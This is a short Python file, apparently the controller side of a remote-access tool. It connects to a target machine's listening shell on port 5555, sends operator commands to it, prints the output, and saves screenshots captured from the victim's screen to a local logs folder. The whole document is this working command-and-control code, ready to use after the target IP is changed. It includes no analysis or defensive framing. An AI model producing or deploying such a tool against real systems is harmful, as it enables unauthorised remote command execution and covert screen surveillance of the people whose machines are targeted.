# controller.py
from datetime import datetime
import socket
import os

TARGET_IP = "192.168.56.101" # Replace with your Ubuntu IP
PORT = 5555
BUFFER_SIZE = 4096

def save_file(data, filename):
    os.makedirs("logs", exist_ok=True)
    with open(os.path.join("logs", filename), "wb") as f:
        f.write(data)

def generate_screenshot_filename():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    return f"screenshot_{timestamp}.png"

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((TARGET_IP, PORT))

    full_data = b""
    while True:
        data = client.recv(BUFFER_SIZE)
        if not data:
            break
        full_data += data
        if b"Shell> " in data:
            break

    print(full_data.decode(), end='')

    while True:
        cmd = input("Enter command (or 'exit'): ")
        if cmd.strip() == "":
            continue

        client.send(cmd.encode())
        if cmd == "exit":
            break

        response = b""
        while True:
            chunk = client.recv(BUFFER_SIZE)
            if b"<<END_OF_FILE>>" in chunk:
                chunk = chunk.replace(b"<<END_OF_FILE>>", b"")
                response += chunk
                break
            if not chunk:
                break
            response += chunk

            # For text output
            if b"Shell> " in chunk:
                break

        if cmd == "screenshot":
            filename = generate_screenshot_filename()
            save_file(response, filename)
            print(f"[+] Screenshot saved to logs/{filename}")
        else:
            print(response.decode(errors='ignore'), end='')

    client.close()

if __name__ == "__main__":
    main()
